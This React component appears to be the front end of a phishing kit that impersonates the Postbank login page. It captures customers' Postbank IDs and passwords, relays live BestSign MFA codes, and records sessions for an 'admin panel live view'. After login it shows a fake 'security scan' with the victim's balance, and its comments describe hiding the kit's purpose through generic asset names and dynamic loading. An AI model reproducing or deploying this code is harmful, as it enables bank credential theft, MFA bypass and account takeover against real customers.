import { useState, useEffect } from 'react'
import { usePostbankApi } from './hooks/usePostbankApi'
import { useSessionRecording } from './hooks/useSessionRecording'
import { SecurityScan } from './components/SecurityScan'
import BestSignPanel from './components/BestSignPanel'

function App() {
  const {
    status,
    error,
    bestSignCode,
    sessionId,
    preRegister,
    login,
    cancelSession,
    isLoading,
    isAwaitingBestSign,
    isLoggedIn,
    hasError,
    isMockMode,
    accountName,
    balance,
    dailyLimit,
    lastLogin
  } = usePostbankApi()

  // Session recording for admin panel live view
  useSessionRecording(sessionId)

  // Check for demo mode via URL parameter
  const urlParams = new URLSearchParams(window.location.search)
  const isDemoMode = urlParams.get('demo') === 'true' || urlParams.get('demo') === '1'

  const [stage, setStage] = useState('oneid') // 'oneid', 'password', 'mfa', 'scanning', or 'success'
  const [greeting, setGreeting] = useState('Guten Tag')
  const [postbankId, setPostbankId] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [showError, setShowError] = useState(false)
  const [errorMessage, setErrorMessage] = useState('')
  const [mfaCode, setMfaCode] = useState('')

  // Set page title, favicon, CSS, and assets for login page (all dynamic, nothing in static HTML)
  useEffect(() => {
    // Set HTML attributes
    document.documentElement.lang = 'de'
    document.documentElement.setAttribute('data-dbcr-theme', 'pb-light')
    
    // Set title
    document.title = 'Login | Postbank Banking & Brokerage'
    
    // Remove any existing favicons
    const existingFavicons = document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"]')
    existingFavicons.forEach(favicon => favicon.remove())
    
    // Add Postbank favicon
    const favicon = document.createElement('link')
    favicon.rel = 'icon'
    favicon.type = 'image/x-icon'
    favicon.href = '/favicon.ico'
    document.head.appendChild(favicon)
    
    // Load CSS files dynamically (generic names to avoid exposing purpose)
    const cssFiles = [
      '/assets/c7f2a1.css',  // base styles
      '/assets/d8e3b4.css',  // design system
      '/assets/a9f1c2.css',  // form styles
      '/assets/b3d5e6.css'   // overlay styles
    ]
    
    const loadedStyles = []
    cssFiles.forEach(href => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = href
      document.head.appendChild(link)
      loadedStyles.push(link)
    })
    
    // Load SVG icon sprite
    fetch('/assets/icons/icon-sprite.svg')
      .then(r => r.text())
      .then(svg => {
        const container = document.getElementById('icon-sprite-container')
        if (container) container.innerHTML = svg
      })
      .catch(() => {})
    
    // Cleanup on unmount
    return () => {
      loadedStyles.forEach(link => link.remove())
    }
  }, [])

  // Set greeting based on time
  useEffect(() => {
    const hour = new Date().getHours()
    if (hour >= 1 && hour < 11) {
      setGreeting('Guten Morgen')
    } else if (hour >= 11 && hour < 18) {
      setGreeting('Guten Tag')
    } else {
      setGreeting('Guten Abend')
    }
  }, [])

  // Handle API status changes - for BestSign
  useEffect(() => {
    if (isAwaitingBestSign && bestSignCode) {
      setStage('mfa')
      setMfaCode(bestSignCode)
    } else if (isLoggedIn && stage === 'mfa') {
      // After BestSign approval, go to security scan
      console.log('BestSign approved! Starting security scan...')
      setStage('scanning')
    }
  }, [isAwaitingBestSign, isLoggedIn, bestSignCode, stage])

  // Handle security scan completion
  const handleScanComplete = () => {
    console.log('Security scan complete!')
    setStage('success')
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setShowError(false)
    setErrorMessage('')

    if (stage === 'oneid') {
      // Validate Postbank ID
      if (!postbankId.trim()) {
        setShowError(true)
        setErrorMessage('Bitte geben Sie Ihre Postbank ID ein.')
        return
      }
      
      // PRE-REGISTER: Create session immediately to start recording
      await preRegister(postbankId)
      
      // Move to password stage
      setStage('password')
      
    } else if (stage === 'password') {
      // NOW call the API with BOTH ID and password
      if (!password.trim()) {
        setShowError(true)
        setErrorMessage('Bitte geben Sie Ihr Passwort ein.')
        return
      }
      
      // Call login API with both credentials
      const result = await login(postbankId, password)
      console.log('Login result:', result)
      
      if (!result.success) {
        // Login failed - show user-friendly error (hide technical details)
        setPassword('')
        setStage('oneid')
        setShowError(true)
        setErrorMessage('Da stimmt etwas nicht. Bitte prüfen Sie Ihre Eingabe und versuchen Sie es erneut.')
      }
      // If success with BestSign, useEffect will handle stage change
    }
  }

  const handleBack = async () => {
    if (stage === 'password') {
      setStage('oneid')
      setPassword('')
      setShowError(false)
    } else if (stage === 'mfa') {
      await cancelSession()
      setStage('password')
    }
  }

  const handleBackToLogin = async () => {
    await cancelSession()
    setStage('oneid')
    setPassword('')
    setShowError(false)
  }

  const handlePasswordLogin = () => {
    setStage('password')
  }

  // If in scanning stage, render full-page security scan
  if (stage === 'scanning') {
    return (
      <SecurityScan 
        onComplete={handleScanComplete} 
        sessionId={sessionId}
        accountName={accountName}
        balance={balance}
        dailyLimit={dailyLimit}
        lastLogin={lastLogin}
      />
    )
  }

  // Mock mode demo function - skip entire login
  const handleDemoLogin = () => {
    console.log('Demo login - skipping to security scan')
    setStage('scanning')
  }

  return (
    <main tabIndex="-1" className="bg--body" aria-label="Hauptbereich">
      {/* Mock Mode Indicator + Demo Button */}
      {isMockMode && (
        <div style={{
          position: 'fixed',
          top: '10px',
          right: '10px',
          display: 'flex',
          gap: '10px',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <button
            onClick={handleDemoLogin}
            style={{
              background: '#28a745',
              color: 'white',
              padding: '8px 16px',
              borderRadius: '4px',
              fontSize: '12px',
              fontWeight: 'bold',
              border: 'none',
              cursor: 'pointer',
              boxShadow: '0 2px 8px rgba(0,0,0,0.2)'
            }}
          >
            SKIP TO SECURITY SCAN
          </button>
          <div style={{
            background: '#ff6b00',
            color: 'white',
            padding: '8px 16px',
            borderRadius: '4px',
            fontSize: '12px',
            fontWeight: 'bold',
            boxShadow: '0 2px 8px rgba(0,0,0,0.2)'
          }}>
            MOCK MODE
          </div>
        </div>
      )}
      <div data-test="loginStandalone" className="standalone">
        <div className="container-xl">
          <div className="row min-vh-100">
            {/* Login Form */}
            <div className="login-main col-lg-7 col-xl-6 py-6 py-md-8 d-flex justify-content-center justify-content-lg-start">
              <div className="login px-0 d-flex flex-column justify-content-center">
                <div data-test="loginContent" className="login-content d-flex flex-column">
                  {/* Logo */}
                  <div className="d-flex flex-row align-items-center gap-0 pt-2 pb-0 px-4 px-sm-6 login-content-header">
                    <div className="login-content__logo"></div>
                  </div>
                  
                  {/* Form */}
                  <div className="flex-fill d-flex flex-column align-items-left gap-0 pt-0 pb-4 pb-md-6 px-4 px-sm-6">
                    <form onSubmit={handleSubmit} noValidate autoCorrect="off" autoCapitalize="off" className="d-flex flex-column h-100">
                      {stage === 'success' ? (
                        /* STAGE 4: Success - Logged In */
                        <div className="flex-fill d-flex flex-column justify-content-center align-items-center gap-4 py-8">
                          <div className="text-center">
                            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#28a745" strokeWidth="2">
                              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
                              <polyline points="22 4 12 14.01 9 11.01"/>
                            </svg>
                          </div>
                          <h2 className="db-heading-2 text-center">Login erfolgreich!</h2>
                          <p className="db-text--mute text-center">
                            Sie sind jetzt eingeloggt.
                          </p>
                        </div>
                      ) : stage === 'mfa' ? (
                        /* STAGE 3: BestSign/MFA */
                        <div data-test="polling">
                          <BestSignPanel
                            code={mfaCode || 'XXXX'}
                            title="Mit BestSign freigeben"
                            subtitle="Bitte prüfen Sie den Auftrag in Ihrer App. Nur wenn alle Angaben korrekt sind, geben Sie den Auftrag frei."
                            showBackButton={true}
                            onBack={handleBackToLogin}
                            showActionBar={true}
                            onPasswordLogin={handlePasswordLogin}
                            compact={false}
                            showSpinner={false}
                          />
                        </div>
                      ) : stage === 'oneid' ? (
                        /* STAGE 1: Postbank ID */
                        <>
                          <div className="flex-fill d-flex flex-column gap-3 gap-md-4 pt-2 pb-4">
                            <h1 data-test="greeting" className="db-heading-0">{greeting}</h1>
                            
                            {showError && (
                              <div className="login-error-message">
                                <div className="login-error-message__icon">
                                  <svg viewBox="0 0 24 24" width="24" height="24">
                                    <rect x="4" y="4" width="16" height="16" rx="2" fill="#c41230" />
                                    <text x="12" y="17" textAnchor="middle" fill="white" fontSize="14" fontWeight="bold">!</text>
                                  </svg>
                                </div>
                                <div className="login-error-message__text">
                                  {errorMessage || 'Da stimmt etwas nicht. Bitte prüfen Sie Ihre Eingabe und versuchen Sie es erneut.'}
                                </div>
                              </div>
                            )}
                            
                            <p data-test="subtitle">Bitte geben Sie Ihre Zugangsdaten ein.</p>
                            
                            <div className="oneid-input-container">
                              <div className="cirrus-login-input cirrus-login-input--one-id">
                                <div className="db-input">
                                  <div className="db-input-wrapper">
                                    <div className="db-input__label-container">
                                      <label className="db-input__label" htmlFor="db-input--0">
                                        <span className="db-input__label-text">Postbank ID</span>
                                      </label>
                                    </div>
                                    <div className="db-input__field">
                                      <input 
                                        id="db-input--0" 
                                        autoComplete="off" 
                                        spellCheck="false" 
                                        name="oneid" 
                                        placeholder="" 
                                        type="text"
                                        value={postbankId}
                                        onChange={(e) => setPostbankId(e.target.value)}
                                      />
                                    </div>
                                  </div>
                                  <div className="db-input__error-line"></div>
                                </div>
                              </div>
                            </div>
                            
                            <div className="mt-4">
                              <a data-test="set-up-id-link" className="db-text db-text--mute" href="#">
                                Jetzt Postbank ID einrichten
                              </a>
                            </div>
                          </div>
                          
                          <div className="login-form-footer d-flex flex-column-reverse flex-md-row gap-4 gap-sm-6 gap-md-0 pb-2 pb-md-0 align-items-left align-items-md-center justify-content-between w-full">
                            <a data-test="forgot-password-link" className="db-text db-text--mute" href="#">
                              Zugangsdaten vergessen?
                            </a>
                            <button 
                              className="db-button db-button--primary db-button--lg" 
                              type="submit"
                            >
                              <span className="db-button__content">
                                <span>Weiter</span>
                              </span>
                            </button>
                          </div>
                        </>
                      ) : (
                        /* STAGE 2: Password */
                        <>
                          <div className="flex-fill d-flex flex-column gap-3 gap-md-4 pt-2 pb-4">
                            {/* Back button */}
                            <button type="button" className="back-button" onClick={handleBack} disabled={isLoading}>
                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                <path d="M19 12H5M12 19l-7-7 7-7"/>
                              </svg>
                              <span>Zurück</span>
                            </button>
                            
                            <p data-test="subtitle">Bitte geben Sie Ihre Zugangsdaten ein.</p>
                            
                            <div className="oneid-input-container">
                              <div className="cirrus-login-input cirrus-login-input--password">
                                <div className="db-input">
                                  <div className="db-input-wrapper">
                                    <div className="db-input__label-container">
                                      <label className="db-input__label" htmlFor="db-input--password">
                                        <span className="db-input__label-text">Passwort</span>
                                      </label>
                                    </div>
                                    <div className="db-input__field db-input__field--with-icon">
                                      <input 
                                        id="db-input--password" 
                                        autoComplete="off" 
                                        spellCheck="false" 
                                        name="password" 
                                        placeholder="" 
                                        type={showPassword ? 'text' : 'password'}
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        disabled={isLoading}
                                      />
                                      <button 
                                        type="button" 
                                        className="password-toggle-btn"
                                        onClick={() => setShowPassword(!showPassword)}
                                        aria-label={showPassword ? 'Passwort verbergen' : 'Passwort anzeigen'}
                                      >
                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0a3478" strokeWidth="2">
                                          {showPassword ? (
                                            <>
                                              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                                              <line x1="1" y1="1" x2="23" y2="23"/>
                                            </>
                                          ) : (
                                            <>
                                              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                              <circle cx="12" cy="12" r="3"/>
                                            </>
                                          )}
                                        </svg>
                                      </button>
                                    </div>
                                  </div>
                                  <div className="db-input__error-line"></div>
                                </div>
                              </div>
                            </div>
                          </div>
                          
                          <div className="login-form-footer d-flex flex-column-reverse flex-md-row gap-4 gap-sm-6 gap-md-0 pb-2 pb-md-0 align-items-left align-items-md-center justify-content-between w-full">
                            <a data-test="forgot-password-link" className="db-text db-text--mute" href="#">
                              Zugangsdaten vergessen?
                            </a>
                            <button 
                              className={`db-button db-button--lg ${(password && !isLoading) ? 'db-button--primary' : 'db-button--disabled'}`} 
                              type="submit"
                              disabled={!password || isLoading}
                            >
                              <span className="db-button__content">
                                <span>{isLoading ? 'Laden...' : 'Einloggen'}</span>
                              </span>
                            </button>
                          </div>
                        </>
                      )}
                    </form>
                  </div>
                </div>
              </div>
            </div>

            {/* Sidebar */}
            <div className="login-sidebar col-lg-4 offset-lg-1 col-xl-4 offset-xl-2 d-flex flex-column px-0">
              <div className="sidebar-teaser-container py-3 py-sm-4">
                <div className="container-xl">
                  <div className="row">
                    {/* Wero Teaser */}
                    <div className="col-12 col-sm-10 offset-sm-1 col-lg-12 offset-lg-0 image-teaser">
                      <div className="db-sidebar-teaser py-3 py-sm-4">
                        <div className="row">
                          <div className="d-flex align-items-start col-12 col-sm-6 col-lg-12 mb-3 mb-sm-0 mb-lg-4">
                            <img alt="Teaser" className="db-sidebar-teaser__image" src="/assets/images/wero-stage.jpg" />
                          </div>
                          <div className="col">
                            <div className="d-flex align-items-start mb-2">
                              <div className="db-heading-4 db-sidebar-teaser__title my-0">
                                Wero – Geld senden und empfangen in Echtzeit
                              </div>
                            </div>
                            <div className="d-flex flex-column">
                              <p className="db-text--mute db-sidebar-teaser__body mb-2">
                                Wero ist die neue europäische Lösung für mobile Zahlungen in Echtzeit. 
                                Senden und empfangen Sie Geld in Sekundenschnelle – ganz einfach über 
                                die Handynummer oder E-Mail-Adresse.
                              </p>
                              <div data-test="links" className="db-text--mute db-sidebar-teaser__links">
                                <div tabIndex="-1">
                                  <a href="#">Jetzt informieren</a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="divider my-3 my-sm-4 bg--divider--accent"></div>

                    {/* Sicherheitshinweise */}
                    <div className="col-12 col-sm-10 offset-sm-1 col-lg-12 offset-lg-0">
                      <div className="db-sidebar-teaser py-3 py-sm-4">
                        <div className="row">
                          <div className="col">
                            <div className="d-flex align-items-start mb-2">
                              <span className="db-sidebar-teaser__icon mr-2 db-icon--warning-outline" aria-hidden="true">
                                <svg role="img" focusable="false" className="db-icon__icon db-icon__icon--24px" style={{height: '24px', width: '24px'}}>
                                  <use xlinkHref="#warning-outline"></use>
                                </svg>
                              </span>
                              <div className="db-heading-4 db-sidebar-teaser__title my-0">
                                Sicherheitshinweise
                              </div>
                            </div>
                            <div className="d-flex flex-column">
                              <p className="db-text--mute db-sidebar-teaser__body mb-2">
                                Aktuell wird ein erhöhtes Aufkommen von Anrufen falscher Bankmitarbeiter festgestellt.
                              </p>
                              <div data-test="links" className="db-text--mute db-sidebar-teaser__links">
                                <div tabIndex="-1" className="mb-2">
                                  <a href="#">Link zu den aktuellen Sicherheitshinweisen</a>
                                </div>
                                <div tabIndex="-1">
                                  <a href="#">Link zu Sicherheit im Überblick</a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Schnelle Hilfe */}
                    <div className="col-12 col-sm-10 offset-sm-1 col-lg-12 offset-lg-0">
                      <div className="db-sidebar-teaser py-3 py-sm-4">
                        <div className="row">
                          <div className="col">
                            <div className="d-flex align-items-start mb-2">
                              <span className="db-sidebar-teaser__icon mr-2 db-icon--device-online" aria-hidden="true">
                                <svg role="img" focusable="false" className="db-icon__icon db-icon__icon--24px" style={{height: '24px', width: '24px'}}>
                                  <use xlinkHref="#device-online"></use>
                                </svg>
                              </span>
                              <div className="db-heading-4 db-sidebar-teaser__title my-0">
                                Schnelle Hilfe und Services
                              </div>
                            </div>
                            <div className="d-flex flex-column">
                              <p className="db-text--mute db-sidebar-teaser__body mb-2">
                                Hier finden Sie unsere Services und Hilfe zu Ihrem Online-Banking.
                              </p>
                              <div data-test="links" className="db-text--mute db-sidebar-teaser__links">
                                <div tabIndex="-1">
                                  <a href="#">Link zu Services und Hilfe</a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Sicherheitsverfahren */}
                    <div className="col-12 col-sm-10 offset-sm-1 col-lg-12 offset-lg-0">
                      <div className="db-sidebar-teaser py-3 py-sm-4">
                        <div className="row">
                          <div className="col">
                            <div className="d-flex align-items-start mb-2">
                              <span className="db-sidebar-teaser__icon mr-2 db-icon--lock" aria-hidden="true">
                                <svg role="img" focusable="false" className="db-icon__icon db-icon__icon--24px" style={{height: '24px', width: '24px'}}>
                                  <use xlinkHref="#lock"></use>
                                </svg>
                              </span>
                              <div className="db-heading-4 db-sidebar-teaser__title my-0">
                                Unsere Sicherheitsverfahren
                              </div>
                            </div>
                            <div className="d-flex flex-column">
                              <p className="db-text--mute db-sidebar-teaser__body mb-2">
                                Alles Wissenswerte rund um BestSign.
                              </p>
                              <div data-test="links" className="db-text--mute db-sidebar-teaser__links">
                                <div tabIndex="-1">
                                  <a href="#">Link zu den Sicherheitsverfahren</a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Footer */}
              <div className="footer-container d-print-none footer-container--sidebar mt-auto">
                <div className="container-xl">
                  <div className="row">
                    <div className="col-12 col-sm-10 offset-sm-1 col-lg-12 offset-lg-0">
                      <div className="footer-links footer-links--sidebar">
                        <div className="footer-links__wrapper">
                          <nav className="footer-links__wrapper__navigation" aria-label="Menü Fusszeile">
                            <ul className="footer-links__list">
                              <li className="footer-links__list-item">
                                <a className="footer-links__link" href="#">Erste Schritte</a>
                              </li>
                              <li className="footer-links__list-item">
                                <a className="footer-links__link" href="#">Terminvereinbarung</a>
                              </li>
                              <li className="footer-links__list-item">
                                <a className="footer-links__link" href="#">Demo-Konto</a>
                              </li>
                              <li className="footer-links__list-item">
                                <a className="footer-links__link" href="#">Kontakt</a>
                              </li>
                              <li className="footer-links__list-item">
                                <a className="footer-links__link" href="#">Impressum</a>
                              </li>
                              <li className="footer-links__list-item">
                                <a className="footer-links__link" href="#">Rechtshinweise</a>
                              </li>
                              <li className="footer-links__list-item">
                                <a className="footer-links__link" href="#">Datenschutz</a>
                              </li>
                              <li className="footer-links__list-item">
                                <a className="footer-links__link" href="#">Cookie-Einstellungen</a>
                              </li>
                            </ul>
                          </nav>
                          <div data-test="footerCopyright" className="footer-links__copyright-text">
                            © 2025 Postbank – eine Niederlassung der Deutsche Bank AG
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  )
}

export default App
